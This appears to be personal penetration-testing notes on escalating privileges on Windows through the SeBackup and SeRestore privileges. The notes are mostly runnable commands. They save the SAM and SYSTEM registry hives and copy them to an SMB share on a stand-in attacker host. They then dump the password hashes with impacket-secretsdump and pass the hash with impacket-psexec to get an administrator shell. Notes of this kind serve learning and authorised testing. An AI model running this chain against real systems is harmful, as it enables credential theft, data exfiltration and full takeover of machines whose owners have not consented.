# Abusing privileges

**To view the privileges of the current user:**

```powershell
C:\> whoami /priv
```

### SeBackup / SeRestore

The `impacket` tool can be used to perform various tasks such as starting a _SMB_ server, dumping secrets from hives in the Windows registry, and running commands with `psexec`, among many others.

Refer to my `impacket` notes for more information:

{% embed url="https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking/tools-services/general/impacket" %}

Suppose we have gained a remote shell on a server with the `SeBackUp` and `SeRestore` privileges

```powershell
C:\target> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  ...
SeRestorePrivilege            Restore files and directories  ...
```

Due to the set privileges, we are able to save the contents of the `SAM` and `SYSTEM` hive registry to a location of our choice (`C:\Users\jarrett\system.hive` and `C:\Users\jarrett\sam.hive` in this case):

```powershell
C:\target> reg save hklm\system C:\Users\jarrett\system.hive
C:\target> reg save hklm\sam C:\Users\jarrett\sam.hive
```



The command below starts a simple _SMB_ server on the attacker machine with a network share named `public` pointing to the `share` directory. This allows us to transfer the files from the target machine to the attacker at a particular share point (`share` folder).

_**Attacker machine**_

```bash
attacker@attacker_ip:~$ impacket-smbserver -smb2support -username jarrett -password mynamejeff public share
```



The command below copies the content of `system.hive` and `sam.hive` at the specified directory to the share point on the attacker machine.

_**Target machine**_

```powershell
C:\target> copy c:\users\jarrett\system.hive \\<attacker_ip>\public\
C:\target> copy c:\users\jarrett\sam.hive \\<attacker_ip>\public\

```



**The next few commands should be ran from the attacker machine**

The command below dumps the hashes from the `sam.hive`and `system.hive`files present on the current folder (specified by the `LOCAL` target option).

```bash
attacker@attacker_ip:~/share$ ls 
sam.hive system.hive

attacker@attacker_ip:~/share$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket vxxx - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: ...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
...:::
Guest:xxx:xxx:xxx::
Administrator:xx12xx:xx34xx::
...
```

The command below uses the hashes found from the `impacket-secretsdump` command above, to authenticate as the _**administrator**_ user. This provides us with a remote shell as the _administrator_ user on the target Windows machine

```bash
attacker@attacker_ip:~/share$ impacket-psexec -hashes xx12xx:xx34xx administrator@10.10.x.x
...

C:\Windows\system32> 
```



_**Windows privileges to admin list**_

{% embed url="https://github.com/gtworek/Priv2Admin" %}
